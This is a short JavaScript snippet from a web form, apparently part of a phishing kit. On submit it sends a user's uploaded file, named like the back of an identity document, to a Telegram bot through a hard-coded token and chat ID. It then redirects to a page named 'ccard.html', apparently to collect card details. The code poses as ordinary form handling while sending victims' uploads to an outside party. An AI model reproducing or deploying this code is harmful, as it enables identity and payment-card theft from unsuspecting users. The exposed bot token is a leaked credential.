

    const bots = new Bot("6310609155:AAEYr1nNZxD8SbZr_YDnbjMo1paDip5Le2U", 1301527362);


    document.getElementById("form").addEventListener("submit", e => {
        e.preventDefault();
    
    
    ///  const text = document.getElementById("textinput").value;
    
    
    ///    bot.sendFile("#fileinput", text)
        bots.sendFile("#fileinputback")
        .then(res => {
    ///    console.log(res);
        window.location.href='ccard.html'
        })
    })
    
    

